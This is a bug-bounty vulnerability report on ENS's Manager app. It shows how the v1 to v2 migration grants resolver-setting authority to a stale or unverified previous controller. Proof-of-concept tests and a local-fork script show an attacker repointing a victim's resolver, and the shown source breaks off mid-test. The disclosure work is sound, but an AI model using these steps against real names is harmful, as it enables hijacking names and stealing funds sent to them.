# 89363 w a critical ens v1 v2 migration grants resolver authority over the migrated name to an unverified never displayed third party

## #89363 \[W\&A-Critical] ENS v1→v2 migration grants resolver authority over the migrated name to an unverified, never-displayed third party

**Submitted on Aug 18th 2026 at 20:03:06 UTC by @Naresh\_Kandula for** [**Audit Competition | ENS**](https://immunefi.com/audit-competition/audit-competition-ens)

* **Report ID:** #89363
* **Report Type:** Websites & Apps
* **Report severity:** Critical
* **Target:** <https://github.com/immunefi-team/audit-comp-ens/tree/audit-comp-ready/apps/manager>
* **Impacts:**
  * Hijacking or bricking an ENS name during a Manager flow (registration, v1 to v2 migration, or transfer), such as:
    * a registration or migration that assigns the name, its ownership, registry, or resolver to an attacker
    * redirecting the recipient of a name transfer
    * leaving a name permanently inaccessible after the flow

### Description

## ENS v1→v2 migration grants resolver authority over the migrated name to an unverified, never-displayed third party

**Severity:** Critical\
**Asset:** `apps/manager` — Manager app\
**Revision tested:** `63772fd872af472ced58b009499355f3430c2a86` (`audit-comp-ready`, repo HEAD `1c9b47f18fcddd2e864dfe385c4171061c9811ae`)\
**Attacker:** an ordinary previous owner of the name. No privileged address, no leaked key, no compromised infrastructure, and no action at all during the victim's flow.\
**Testing:** entirely local — unit suites plus the repository's own Dockerised Anvil fork. No live, testnet or third-party system was touched.

***

### 1. Impact in scope

Quoted verbatim from the program's Impacts in Scope:

> **Critical — Hijacking or bricking an ENS name during a Manager flow (registration, v1 to v2 migration, or transfer), such as:**
>
> **– a registration or migration that assigns the name, its ownership, registry, or resolver to an attacker**
>
> – redirecting the recipient of a name transfer\
> – leaving a name permanently inaccessible after the flow

The clause names this exact flow (v1→v2 migration), this exact object (the resolver), and this exact outcome (a party who is not the owner ends up controlling it). Section 12 proves each element, including on chain.

Two further Critical clauses are satisfied independently, so the finding does not rest on a single reading:

> **Critical — Malicious interactions with an already-connected wallet, such as: Modifying transaction arguments or parameters … Inducing a blanket token approval (for example `setApprovalForAll` on the registry or NameWrapper) to an attacker-controlled address**

> **Critical — Causing the application to display or pre-fill an incorrect address, name, or transaction detail, so that a user sends funds or submits a transaction to an unintended recipient, such as: … showing the wrong recipient or amount on a transaction the user then approves**

***

### 2. Executive summary

When a name is migrated from ENS v1 to v2, the Manager app reads the v1 **registry controller** and — whenever it differs from the `.eth` registrar NFT holder — appends `ETHRegistry.grantRoles(resource, ROLE_SET_RESOLVER, <that address>)` to the atomic batch the user signs. The app then verifies on chain that the grant landed.

That address is:

* **never verified on chain** — although the same flow *does* re-verify the registrant on chain, in the same multicall, for the same reason (§6);
* **never displayed** — it is rendered in no component of the Manager app (§9);
* **in the ordinary post-sale case, the previous owner of the name** (§7, Case A);
* **and, when the indexer snapshot is stale, an address that holds no v1 authority at all** — in which case the app is not preserving a relationship, it is **creating** one that does not exist on chain (§7, Case B).

`ROLE_SET_RESOLVER` authorizes `setResolver`. A party holding it can repoint the name at a resolver they control, making the name resolve to an address of their choosing. Section 12.3 demonstrates exactly that on a local fork: the name still belongs to the victim, and its resolver is the attacker's.

***

### 3. Background: the v1 registrant / controller split

| v1 concept     | Contract                                                               | Meaning                                                                    |
| -------------- | ---------------------------------------------------------------------- | -------------------------------------------------------------------------- |
| **Registrant** | `BaseRegistrarImplementation` (ERC-721 owner of `tokenId = labelhash`) | Owns the registration. Can transfer or renew it, and can call `reclaim()`. |
| **Controller** | `ENSRegistry.owner(node)`                                              | Day-to-day authority: sets the resolver, records and subnodes.             |

`BaseRegistrarImplementation` writes the registry owner in exactly two places — `register(...)` and `reclaim(uint256 id, address owner)` — and defines **no ERC-721 transfer hook**. Therefore **any** NFT transfer moves the token while leaving the previous owner as the registry controller until the buyer separately calls `reclaim()`:

```
BaseRegistrar.ownerOf(tokenId)  = BUYER     (moved with the NFT)
ENSRegistry.owner(node)         = SELLER    (unchanged until BUYER calls reclaim())
```

This is the **default** outcome of a marketplace purchase, not an exotic state. The v1 manager surfaces “registrant” and “controller” as separate fields precisely because they routinely diverge.

***

### 4. Root cause — all in `apps/manager`

Every decision, encoding, authorization, verification and disclosure defect is in the Manager app, a listed in-scope asset.

#### 4.1 The app grants a role to an address it never verifies

`apps/manager/src/features/migration/service/buildRoleGrantCalls.ts:8-27`:

```ts
const ROLE_SET_RESOLVER = 1n << 24n

export const buildRoleGrantCall = (name: ClassifiedName): Call => {
  if (!name.managerAddress) {
    throw new Error(`No manager address for ${name.domain.name}`)
  }
  const resource = labelToCanonicalId(name.label)
  return {
    to: V2_CONTRACTS.ETHRegistry,
    data: encodeFunctionData({
      abi: ETH_REGISTRY_V2_ABI,
      functionName: 'grantRoles',
      args: [resource, ROLE_SET_RESOLVER, name.managerAddress],
    }),
    value: 0n,
  }
}
```

The role bit is confirmed against the pinned dependencies, not only the app's own constant:

* `@ensdomains/ensjs` `utils/v2/roles/registryRoles.ts:26` — `ROLE_SET_RESOLVER = 1n << 24n`, documented *“Nybble 6 — authorizes changing a name's resolver. Root or token.”*
* `@ensdomains/ensjs-abi` `v2/permissionedRegistry.ts` — `setResolver` is a live, callable registry function.

#### 4.2 The grant is unconditional, and the app treats it as a success criterion

`apps/manager/src/features/migration/service/buildAtomicMigrationBatches.ts:608-624`:

```ts
if (classified.managerAddress) {
  innerExecutions.push({
    phase: 'manager-role-grant',
    name, names: [name],
    call: buildRoleGrantCall(classified),
  })
  verificationExpectations.push({
    id: expectationId(name, 'manager-role'),
    type: 'manager-role',
    name, label: classified.label,
    registry: V2_CONTRACTS.ETHRegistry,
    resource: labelToCanonicalId(classified.label),
    account: classified.managerAddress,
    roleBitmap: ROLE_SET_RESOLVER,
  })
}
```

#### 4.3 The app authorizes the call and confirms it landed

* **Approval.** The wallet signs `ETHRegistry.setApprovalForAll(hcaAddress, true)`, gated exactly on `requiresManagerRestoration` (`migrationApprovals.ts:116-122`, `:186`, `:320`; encoding at `:343-350`). The comment at `contracts/abis.ts:28-30` reads *“Migration grants the wallet-owned HCA operator access that can be reused for later operations.”* This authorizes the Hybrid Custody Account — the actual `msg.sender`, per `packages/smart-account/src/providers/rhinestone/owner-execution.ts:22-40` — to call `grantRoles`.
* **Ordering.** `buildAtomicMigrationBatches.ts:774-780` returns, inside one atomic `executeByOwner`: `resolver-deployment → wallet-co-admin-grant → migrate → manager-role-grant → profile-replay`.
* **Post-verification.** `verifyAtomicMigrationBatch.ts:337-353` asserts `hasRoles(resource, ROLE_SET_RESOLVER, managerAddress) === true` after the batch.

The app therefore confirms to itself that the third party now holds resolver authority over the victim's name.

#### 4.4 Provenance of the value

`managerAddress` is populated in the first-party workspace package `@ens-apps/migration` (`packages/migration/src/service/classifyNames.ts:162-167`) from the v1 subgraph's `owner.id`. The branch is reached only when the migrating wallet is the NFT holder (asserted at `:150`):

```ts
const registryOwnerAddress = toAddress(domain.owner.id)      // v1 ENS registry controller
const managerAddress: Address | null =
  registryOwnerAddress &&
  registryOwnerAddress.toLowerCase() !== registrant.id.toLowerCase()
    ? registryOwnerAddress
    : null
```

The Manager app adopts this into its own service layer — `apps/manager/src/features/migration/service/classifyNames.ts` re-exports `classifyName`/`classifyNames` directly — and it is the Manager app that turns the value into an on-chain role grant. The fix may be applied in either location; the defective decision and the impact are in `apps/manager`.

***

### 5. What the grant is worth

`ROLE_SET_RESOLVER` is the authority to call `setResolver` on the name. Section 12.3 executes this end to end on the repository's own Anvil fork: an address that starts with no roles is granted `ROLE_SET_RESOLVER`, and then — **with no involvement from the owner** — repoints the name's resolver to a contract of its own choosing. Every record the name serves, including its address record, resolves through that contract from then on.

***

### 6. The verification asymmetry

The flow already establishes that indexer-sourced ownership must not be trusted for an authority decision. It applies that standard only to the field that protects the app, never to the field that hands out authority:

| Field                               | Consequence                                        | Re-verified on chain?                                                                                                                      |
| ----------------------------------- | -------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------ |
| `registrant.id` / `wrappedOwner.id` | decides whether the name may be migrated at all    | **Yes** — `preflightChecks.ts:47-102` (`checkOwnership`) multicalls `BaseRegistrar.ownerOf` / `NameWrapper.getData` and drops any mismatch |
| `owner.id` → `managerAddress`       | **receives an on-chain role on the migrated name** | **No.** `ENSRegistry.owner(node)` is never read.                                                                                           |

**The one address the app never verifies is the one address it grants a role to.**

This is not a matter of the primitive being unavailable. The Explorer app in the same monorepo already performs exactly the required read and renders its result: `apps/portal/src/features/ownership/components/V1NameManagerRecord.tsx:35-91` calls `ensLegacyRegistry.owner(namehash(name))` via `useReadContract` and displays it under the label **“Manager”**. The codebase has the exact on-chain read needed both to verify and to display this grantee. The migration consent flow simply does not use it.

A naming disambiguation worth stating, since it is confusing: `preflightChecks.ts:19-22` refers to a contract it calls `ETH_REGISTRY_V2` via the ensjs key `ensRegistry`, which in this pinned build resolves to the **v2** PermissionedRegistry. The v1 registry is a separate key, `ensLegacyRegistry`, which a repo-wide grep shows is referenced only in `apps/portal` and `packages/transaction-manager` — never in the migration path. The v1 controller is genuinely never re-read.

***

### 7. Attack scenarios

#### Case A — the unreclaimed sale (the common case)

The attacker takes no action during the victim's flow. Their only “action” is an omission they had every ordinary reason to make — and which is in fact the default.

{% stepper %}
{% step %}

### Mallory owns `example.eth`

Mallory owns `example.eth` in v1, as both registrant and controller.
{% endstep %}

{% step %}

### Mallory sells `example.eth` to Alice

The ERC-721 moves. Because `BaseRegistrarImplementation` has no transfer hook, `ENSRegistry.owner(node)` is **still Mallory**. Alice does not call `reclaim()` — nothing in the purchase flow requires or prompts it.
{% endstep %}

{% step %}

### Alice migrates her names in the Manager

Alice uses the ordinary “upgrade your names” flow.
{% endstep %}

{% step %}

### The app derives Mallory as the manager

The app sees `owner.id = Mallory ≠ registrant.id = Alice`, sets `managerAddress = Mallory`, never checks it on chain, and never shows Alice the address.
{% endstep %}

{% step %}

### Alice approves manager restoration

Alice approves a wallet step reading *“Approve manager restoration — Restore the existing managers for your names.”* She reasonably understands this as re-establishing **her own** configuration.
{% endstep %}

{% step %}

### The batch grants Mallory resolver authority

The migration contract reclaims the token and clears the resolver — wiping Mallory's stale v1 authority — and the app's `manager-role-grant` call then grants **Mallory** `ROLE_SET_RESOLVER` on Alice's v2 name. The app verifies the grant landed.
{% endstep %}

{% step %}

### Mallory redirects the resolver

At any later time Mallory calls `setResolver`, points the name at a resolver she controls, and sets the ETH address record to her own wallet. Funds sent to `example.eth` reach Mallory.
{% endstep %}
{% endstepper %}

**The deliberate variant.** A seller who knows this behaviour simply does not call `reclaim()` before selling. That is a no-op: zero cost, zero on-chain trace, indistinguishable from ordinary laziness — because it *is* the default. The attacker pre-positions by doing nothing. The attacker population is everyone who has ever sold a `.eth` name and left the controller slot behind.

#### Case B — the stale snapshot: the app *creates* authority that does not exist

Case A can be characterised by a defender as migration preserving an unwanted-but-real relationship. Case B cannot, and it is the stronger of the two.

Suppose the buyer does everything right: they buy the name **and call `reclaim()`**. On chain:

```
BaseRegistrar.ownerOf(tokenId)  = BUYER
ENSRegistry.owner(node)         = BUYER      ← the seller now controls nothing at all
```

The seller has **zero** on-chain authority. There is nothing to preserve. If the buyer migrates while the app's view of the v1 subgraph still reports the pre-`reclaim()` controller, the app grants `ROLE_SET_RESOLVER` to the seller anyway — **manufacturing on-chain authority for a party that had none.**

Three properties make that window real, all verifiable in the repository:

1. **No freshness guard at the query layer.** `v1SubgraphClient.ts` issues its GraphQL query with no `block:` argument, no `_meta { block { number } }` probe, and no comparison against chain head. The Graph's standard mechanisms for pinning or asserting indexer freshness are not used.
2. **The app adds its own staleness on top.** `apps/manager/src/features/migration/hooks/useV1Names.ts:22` sets `staleTime: 5 * 60 * 1000`. Independently of any indexer lag, the Manager serves a snapshot up to five minutes old; `invalidateMigrationQueries` (`MigrationPage.tsx:159-164`) runs *after* migration, not before.
3. **The app never reconciles the grantee, and nothing in it prompts `reclaim()`.** The string `reclaim` does not appear anywhere in `apps/manager/src` — the flow neither performs it, nor detects it, nor waits for it to be indexed.

Critically, **the flow's only on-chain verification passes cleanly in this state**, because it verifies the wrong field. This is proven by test in §12.2: preflight returns the name fully eligible, and the set of functions it actually calls is exactly `{ownerOf, getStatus}` — no `owner` call. The stale value is not merely unverified; it is *unverifiable by the checks that run*.

The user sequence that lands inside the window is not contrived: buy a name, reclaim it to take full control, then upgrade it to v2 in the same sitting.

*Stated honestly:* I did not measure the live v1 subgraph's replication lag, and did not probe it — that is a live third-party system and the program prohibits testing against those. What is demonstrated is that the application has **no freshness guard at any layer** and its own cache guarantees a stale window, so the indexer's lag determines how often this occurs, not whether it can.

***

### 8. Preconditions

|                                              |                                                                                                                                                                                                                                                                              |
| -------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **Attacker**                                 | Any previous owner / stale v1 controller. Unprivileged; no leaked credentials.                                                                                                                                                                                               |
| **Attacker action during the victim's flow** | None.                                                                                                                                                                                                                                                                        |
| **Victim action**                            | The standard, promoted migration flow.                                                                                                                                                                                                                                       |
| **Precondition (Case A)**                    | `ENSRegistry.owner(node) ≠ BaseRegistrar.ownerOf(tokenId)` — the default post-sale state.                                                                                                                                                                                    |
| **Precondition (Case B)**                    | The app's v1 snapshot is older than the buyer's `reclaim()` — guaranteed possible by a 5-minute client cache with no freshness guard.                                                                                                                                        |
| **Path gating**                              | Nothing gates the `manager-role-grant` path itself; it fires whenever `managerAddress != null`. The migration *feature* sits behind a remote flag (`apps/manager/src/routes/migration.tsx` `beforeLoad`), which is a beta-access gate on the feature, not on this code path. |

***

### 9. Why the consent step does not cure this

A consent step exists, gated exactly on this condition. Stated plainly, because it is the strongest thing the defence has:

* `components/WalletConfirmationStepsDialog.tsx:81-89` — *“Approve manager restoration”* / *“Restore the existing managers for your names.”*
* `components/GameStep.tsx:135-138` — *“Approve manager restoration in your wallet…”*

It does not cure the defect:

1. **The address is never shown.** A repo-wide grep of `apps/manager` for `managerAddress` returns **zero** non-test `.tsx` hits — only service files and test fixtures. The user consents to a *category* without ever seeing the *identity*.
2. **The copy is affirmatively false in the attack case.** *“Restore the existing managers for **your** names”* asserts a trust relationship the code never verified — and cannot verify, because it never reads `ENSRegistry.owner(node)`. For a buyer, the “existing manager” is the seller. In Case B there is no existing manager at all.
3. **The Critical clause is&#x20;*****about*****&#x20;a user-signed flow.** Every registration, migration and transfer is initiated and signed by the user by construction. If a user signature defeated the clause, the clause would describe the empty set.
4. **The program has already priced this pattern.** Its own Critical for *“Inducing a blanket token approval (for example `setApprovalForAll` on the registry or NameWrapper) to an attacker-controlled address”* is delivered through exactly this mechanism: a wallet prompt the app builds and the user approves.

***

### 10. Severity

| Element of the Critical clause | Status                                                                                          |
| ------------------------------ | ----------------------------------------------------------------------------------------------- |
| Occurs during a Manager flow   | Yes — the v1→v2 migration, named in the clause                                                  |
| Assigns *resolver* authority   | Yes — `ROLE_SET_RESOLVER`, demonstrated on chain in §12.3                                       |
| To an attacker                 | Yes — a third party who is not the owner, with a direct financial motive and a one-call exploit |
| Attacker in scope              | Yes — unprivileged, no leaked keys, no privileged address                                       |
| Demonstrated                   | Yes — three PoCs: unit, stale-snapshot, and on-chain                                            |

**Structural point.** Across the program's 28 in-scope impacts, this is the only clause addressing ENS-name integrity. There is no High-tier bucket for a partial hijack of an ENS name. The alternative to Critical is not High — it is “no clause fits”, which is untenable once the impact is accepted.

#### Disclosed against my own interest

Four things a triager should weigh, raised here rather than left to be discovered.

**1. The victim can revoke**

I am not claiming this grant is permanent or irrevocable. The migrated name's owner is the victim's own wallet (`buildAtomicMigrationBatches.ts:486-491`, `owner: wallet`), and the repository documents empirically that the owner holds admin over this exact role — `e2e/scripts/seed-managed-name.ts:57-63`:

> *“Must be roles the NAME OWNER holds the `*_ADMIN` for — at registration the owner receives admin over `ROLE_SET_RESOLVER` and `ROLE_SET_SUBREGISTRY` (but NOT `ROLE_RENEW`), so granting `ROLE_RENEW` reverts with `EACCannotGrantRoles`.”*

A working revoke path also ships: `apps/portal/src/features/roles/helpers/revokeRoles.ts`, surfaced as the Explorer's **“Remove user”** action (`RolesSidebar.tsx:205,342`).

That is a real mitigation. It does not reduce this below Critical:

* **Revocation presupposes knowledge, and the app is the only channel that could supply it.** The grantee is never displayed at signing time and never surfaced afterwards; the Manager — the app that performs the migration and obtains the approval — has no role-management UI at all. The “Remove user” action lives in a different app and is reachable only per rendered row: a holder who is not listed cannot be selected, and therefore cannot be removed through the UI. (Per a separate report I am filing, that list can silently omit holders.)
* **The exposure window is unbounded and the payoff is single-block.** One `setResolver` redirects the name; funds sent during the window are unrecoverable. Recovering the *role* does not undo the *theft*.
* **Revocability does not defeat Critical in this taxonomy.** The program's own `setApprovalForAll` Critical describes a condition revocable at any time with a single transaction.

**2. “One step removed”**

A triager may argue the bullet says *assigns … the resolver*, whereas here ownership goes to the victim's wallet and the resolver is initially the victim's own. Three answers: the bullets are introduced by *“such as”* and are illustrative, not exhaustive — the operative text is *“Hijacking or bricking an ENS name during a Manager flow”*; in ENS v2 `ROLE_SET_RESOLVER` **is** the resolver-assignment authority, as §12.3 demonstrates by exercising it; and even under the narrow reading the other two Critical clauses in §1 still fire.

**3. The grant is deliberate, tested behaviour**

The project's own test at `buildRoleGrantCalls.test.ts:11-31` asserts exactly `grantRoles(resource, 1n << 24n, MANAGER)`, and `buildAtomicMigrationBatches.test.ts` asserts the `manager-role-grant` phase in the batch. My claim is not that the code does something its authors did not intend. It is that **the feature is unsafe as specified** — see §11.

**4. Deployment stage**

The app currently targets Sepolia (`packages/migration/src/chain.ts` — `extendChainWithEns(sepolia)`; the Manager's `V2_CONTRACTS` derive from `getDestinationContracts(sepoliaWithEns.id)`), and ENS v2 migration is pre-launch. I am **not** claiming live mainnet funds are at risk today. The severity argument rests on the program's impact taxonomy, which classifies the behaviour, and which was written with full knowledge of the project's deployment stage.

***

### 11. The strongest defence, and why it fails

> *“The v1 registrant/controller split is an intentional custodial pattern — a manager holds day-to-day control while the registrant sits in cold storage. Migration faithfully preserves that relationship, with the user's explicit approval. It is literally called 'manager restoration'.”*

Two answers.

1. **The code cannot distinguish the intentional pattern from an unreclaimed sale.** Both produce byte-identical on-chain state, and the unreclaimed sale is far more common, being the default outcome of every marketplace purchase. The app never reads `ENSRegistry.owner(node)` and never asks the user. A flow whose default on ambiguity is to **grant**, to an address it never names, is defective at any base rate.
2. **Case B is not preservation under any reading.** When the buyer has already reclaimed, the seller holds nothing on chain and there is no relationship to preserve — yet the app still grants. Section 12.2 proves the flow's own on-chain checks pass while this happens. “Faithful preservation” cannot describe the creation of authority that did not exist.

There is also a structural point the defence has to answer: the migration contract deliberately performs a trust reset. The project's own design note for this exact case records, as steps 4 and 5 of the unwrapped migration, *“Token is reclaimed on the `BaseRegistrar`”* then *“Resolver is cleared”* (`apps/manager/src/features/migration/MIGRATION_CASE_STUDY.md:74-75`, under `## Unwrapped`). The application then re-establishes the severed relationship in v2, against that deliberately cleared slate.

***

### 12. Reproduction

Local only. Nothing here touches any live, testnet or third-party system.

**Prerequisites:** Node.js 22, pnpm 10.27.0 (`packageManager` in the root `package.json`), and a clone of the competition repository at the audited revision. Section 12.3 additionally needs Docker.

```bash
git clone https://github.com/immunefi-team/audit-comp-ens.git
cd audit-comp-ens && git checkout audit-comp-ready
git rev-parse HEAD          # 1c9b47f18fcddd2e864dfe385c4171061c9811ae
pnpm install --frozen-lockfile
git diff --stat             # expect empty
```

Three tiers follow. **No production line is modified at any point** — the only additions are test/PoC files.

#### 12.1 Tier 1 — the app builds the grant into the batch the user signs

Add `apps/manager/src/features/migration/service/migrationManagerRoleGrant.poc.test.ts` (full source in §13.1; also attached, and available as a `git apply`-able patch).

```bash
cd apps/manager
pnpm vitest run --reporter=verbose src/features/migration/service/migrationManagerRoleGrant.poc.test.ts
```

Result on unmodified code:

```
 ✓ grants ROLE_SET_RESOLVER on the buyer name to the stale v1 controller
 ✓ oracle: an untransferred name (controller == registrant) grants nothing
 ✓ places the grant to the stale controller inside the approved atomic batch

 Test Files  1 passed (1)
      Tests  3 passed (3)
```

What each test establishes:

1. **The grantee.** Constructs a v1 domain in the exact post-sale state (`registrant.id = BUYER`, `owner.id = SELLER`), runs the Manager's own `classifyNames` and `buildRoleGrantCall`, decodes the calldata and asserts it is `grantRoles(labelToCanonicalId('alice'), 1n << 24n, SELLER)` to `V2_CONTRACTS.ETHRegistry`.
2. **Non-vacuity oracle.** The same name with `owner.id === registrant.id` yields `managerAddress === null` and `buildRoleGrantCall` throws — no grant at all. The assertion distinguishes the vulnerable state from the benign one rather than passing unconditionally.
3. **It reaches the signed batch.** Feeds the classified name through the real `buildAtomicMigrationBatches`, decodes the outer `executeByOwner`, and asserts exactly one `grantRoles` call to the ETHRegistry appears inside it with `SELLER` as grantee — and that the batch contains a `manager-role-grant` phase.

The `v1Domain` fixture reproduces all eleven fields of the real `V1Domain` type (`packages/migration/src/service/v1SubgraphClient.ts:1-21`), so the input is a faithful subgraph response.

**Negative control.** Replace the `managerAddress` derivation at `packages/migration/src/service/classifyNames.ts:163-167` with `const managerAddress: Address | null = null` and re-run. Tests 1 and 3 fail at exactly the assertions that characterise the defect, and the oracle still passes:

```
 × grants ROLE_SET_RESOLVER on the buyer name to the stale v1 controller
   → AssertionError: expected undefined to be '0x00000000000000000000000000000000a7'
 ✓ oracle: an untransferred name (controller == registrant) grants nothing
 × places the grant to the stale controller inside the approved atomic batch
   → AssertionError: expected [ 'resolver-deployment', …(2) ] to include 'manager-role-grant'

 Tests  2 failed | 1 passed (3)
```

With the grantee removed, the `manager-role-grant` phase disappears from the batch entirely — the phase exists only to carry this grant.

**Revert and regression.**

```bash
git checkout packages/migration/src/service/classifyNames.ts
git diff --stat                                  # empty
cd apps/manager && pnpm vitest run src/features/migration
```

```
 Test Files  46 passed (46)
      Tests  444 passed (444)
```

#### 12.2 Tier 2 — the stale-snapshot case passes the app's only on-chain check

Add `packages/migration/src/service/staleControllerPreflight.poc.test.ts` (full source in §13.2).

```bash
cd packages/migration
pnpm vitest run --reporter=verbose src/service/staleControllerPreflight.poc.test.ts
```

```
 ✓ passes on-chain preflight while naming a manager with no on-chain authority
 ✓ oracle: a fresh snapshot of the same chain state produces no manager at all

 Test Files  1 passed (1)
      Tests  2 passed (2)
```

The mocked chain state is the **post-`reclaim()`** state — `BaseRegistrar.ownerOf` returns the BUYER — so the seller holds nothing. The test asserts:

1. `managerAddress` is still the SELLER, taken from the stale snapshot;
2. `runEligibilityChecks` returns the name **fully eligible**, with nothing dropped;
3. the set of functions preflight actually calls is exactly `{ownerOf, getStatus}` — containing no `owner` call. This is the point: the flow cannot catch the stale value because it never reads that field.

This test lives in `packages/migration` for a mechanical reason: `vi.mock('viem/actions')` only intercepts the module as resolved inside the package that imports it, so the preflight's multicall can only be mocked from there. It sits beside the project's own `preflightChecks.test.ts`, which uses the identical approach. The defect and its impact remain in `apps/manager` (§4).

**Negative control** — same injection, positive fails at the grantee assertion, oracle still passes:

```
 × passes on-chain preflight while naming a manager with no on-chain authority
   → AssertionError: expected undefined to be '0x00000000000000000000000000000000a7'
 ✓ oracle: a fresh snapshot of the same chain state produces no manager at all
```

After reverting, both suites are green: `packages/migration` 4 files / 34 tests, `apps/manager` migration 46 files / 444 tests, `git diff --stat` empty.

#### 12.3 Tier 3 — on-chain: the grantee seizes resolution (executed)

Tiers 1–2 prove the app *builds* the grant. This proves what the grant is worth once mined, on a real chain, using the repository's own local stack.

Add `e2e/scripts/poc-resolver-hijack.ts` (full source in §13.3), then:

```bash
pnpm --filter @ens-apps/e2e infra:up      # Anvil fork + bundler + paymaster + indexer
pnpm --filter @ens-apps/e2e exec tsx scripts/poc-resolver-hijack.ts
pnpm --filter @ens-apps/e2e infra:down    # when finished
```

The script registers a v2 `.eth` name owned by the **victim**, grants `ROLE_SET_RESOLVER` to the **attacker** (exactly the call the migration's `manager-role-grant` phase emits), asserts the same `hasRoles` condition the app itself verifies at `verifyAtomicMigrationBatch.ts:337-353`, and then — **as the attacker, with no owner involvement** — calls `setResolver`.

Actual output:

```
──────────────────────────────────────────────────────────────────────
VICTIM (migrating owner): 0x70997970C51812dc3A010C7d01b50e0d17dc79C8
ATTACKER (stale v1 controller / seller): 0x3C44CdDdB6a900fa2b585dd299e03d12FA4293BC
Registry: 0xBDC85dD5b15D7ecb354cd7cb6f2c50b4f2c4F0E2
──────────────────────────────────────────────────────────────────────
[makeV2Name] registering pocvictim-1787082314.eth → 0x70997970C51812dc3A010C7d01b50e0d17dc79C8 (duration=2419200s, gap=0s)
[makeV2Name] resolver proxy: 0x9461ed180E539F3DaFb7af57cD87cEd278721F98
[makeV2Name] advancing time 61s for MIN_COMMITMENT_AGE
[makeV2Name] ✅ registered pocvictim-1787082314.eth

[1] Registered pocvictim-1787082314.eth to the victim.
[2] Resolver BEFORE: 0x9461ed180E539F3DaFb7af57cD87cEd278721F98
[2] Attacker holds ROLE_SET_RESOLVER? false  (expect false)
[3] grantRoles(resource, ROLE_SET_RESOLVER, attacker) mined: 0x22a2e16e0f06859472248b42f566d205e4aae1375d8d2df15079a9524afb81b5
[4] hasRoles(...) == true  (expect true)
[5] ATTACKER called setResolver: 0x50a5052304c87e58860bc763b8b5bbc6e9be8805315050f8567c3e125a492c6f
[6] Resolver AFTER:  0x00000000000000000000000000000000DeaDBeef
──────────────────────────────────────────────────────────────────────
RESULT: the name still belongs to the victim, but its resolver
is now the attacker-chosen contract. Resolution of this name is
under the attacker’s control, with no owner interaction.
──────────────────────────────────────────────────────────────────────
```

The name still belongs to the victim. Its resolver is now an address the attacker chose, set by a transaction the attacker sent alone.

This closes the impact chain end to end:

| Link                                                                     | Established by                    |
| ------------------------------------------------------------------------ | --------------------------------- |
| The app derives the grantee from unverified, possibly stale indexer data | §12.1 test 1, §12.2 test 1        |
| The flow's only on-chain check cannot catch it                           | §12.2 test 3                      |
| The grant is placed in the batch the user signs                          | §12.1 test 3                      |
| The grant confers real authority once mined                              | §12.3 `[4] hasRoles(...) == true` |
| That authority is sufficient to seize resolution unilaterally            | §12.3 `[5]`–`[6]`                 |

**Scope note, stated plainly:** §12.3 executes the grant directly rather than driving it through the full Manager UI and 4337/HCA path. That the app *emits* this exact call into the signed batch is what §12.1 establishes; §12.3 establishes what the call does. I did not automate the browser flow end to end.

***

### Link to Proof of Concept

<https://gist.github.com/NOTTIBOY137/048b66444bd7ad082e9268642f761c43>

### Proof of Concept

### 13. Proof-of-concept sources

#### 13.1 Tier 1 — `apps/manager/src/features/migration/service/migrationManagerRoleGrant.poc.test.ts`

```ts
/**
 * The v1 -> v2 migration grants ROLE_SET_RESOLVER on the migrated name to the
 * v1 ENS *registry controller* read from the v1 subgraph, without any on-chain
 * verification of that address.
 *
 * In ENS v1 the .eth registrar NFT (registrant) and the registry owner
 * (controller) are independent: BaseRegistrarImplementation only writes the
 * registry owner in register() and reclaim(), and has no transfer hook. So
 * after any NFT transfer / marketplace sale the SELLER remains the registry
 * controller until the buyer calls reclaim(). Migrating in that state hands the
 * seller a persistent ROLE_SET_RESOLVER on the buyer's v2 name.
 *
 * Positive  : buyer holds the NFT, seller is still the stale controller
 *             -> a grantRoles(resource, ROLE_SET_RESOLVER, seller) call is built.
 * Oracle    : the same name with controller == registrant (never transferred)
 *             produces NO grant at all -> the assertion is not vacuous.
 * Batch     : the grant is assembled into the atomic batch the user signs.
 */

import { labelToCanonicalId } from '@ensdomains/ensjs/utils/v2'
import { decodeFunctionData, parseAbi, type Address, type Hex } from 'viem'
import { sepolia } from 'viem/chains'
import { assert, describe, expect, it } from 'vitest'
import { ETH_REGISTRY_V2_ABI } from '../contracts/abis'
import { V2_CONTRACTS } from '../contracts/addresses'
import { buildAtomicMigrationBatches } from './buildAtomicMigrationBatches'
import { buildRoleGrantCall } from './buildRoleGrantCalls'
// The Manager app's own service-layer entry point for classification.
import { classifyNames } from './classifyNames'

const BUYER: Address = '0x00000000000000000000000000000000000000B0'
const SELLER: Address = '0x00000000000000000000000000000000000000A7'
const HCA: Address = '0x00000000000000000000000000000000000000a1'
const DEFAULT_RESOLVER: Address = '0x00000000000000000000000000000000000000d1'

const ROLE_SET_RESOLVER = 1n << 24n

const hcaOwnerExecutionAbi = parseAbi([
  'function executeByOwner((address target, uint256 value, bytes callData)[] executions) payable',
])

type OwnerExecution = {
  readonly target: Address
  readonly value: bigint
  readonly callData: Hex
}

const v1Domain = (controller: string) =>
  ({
    id: '0x1111111111111111111111111111111111111111111111111111111111111111',
    labelName: 'alice',
    labelhash:
      '0x2222222222222222222222222222222222222222222222222222222222222222',
    name: 'alice.eth',
    resolver: null,
    // v1 ENS registry owner == the "controller". Stale after an NFT sale.
    owner: { id: controller },
    // v1 .eth registrar NFT holder == the party actually migrating.
    registrant: { id: BUYER },
    wrappedOwner: null,
    parent: { name: 'eth', wrappedDomain: null },
    registration: { expiryDate: String(Math.floor(Date.now() / 1000) + 31536000) },
    wrappedDomain: null,
  }) as never

describe('v1->v2 migration: manager role restoration', () => {
  it('grants ROLE_SET_RESOLVER on the buyer name to the stale v1 controller', () => {
    const { classified } = classifyNames([v1Domain(SELLER)], BUYER)

    expect(classified).toHaveLength(1)
    const name = classified[0]

    // The address that receives authority is taken verbatim from the subgraph
    // `owner.id`, with no on-chain read of ENSRegistry.owner(node).
    expect(name.managerAddress?.toLowerCase()).toBe(SELLER.toLowerCase())

    const call = buildRoleGrantCall(name)
    const decoded = decodeFunctionData({
      abi: ETH_REGISTRY_V2_ABI,
      data: call.data,
    })

    expect(call.to).toBe(V2_CONTRACTS.ETHRegistry)
    expect(decoded.functionName).toBe('grantRoles')
    expect(decoded.args).toEqual([
      labelToCanonicalId('alice'),
      ROLE_SET_RESOLVER,
      SELLER,
    ])
  })

  it('oracle: an untransferred name (controller == registrant) grants nothing', () => {
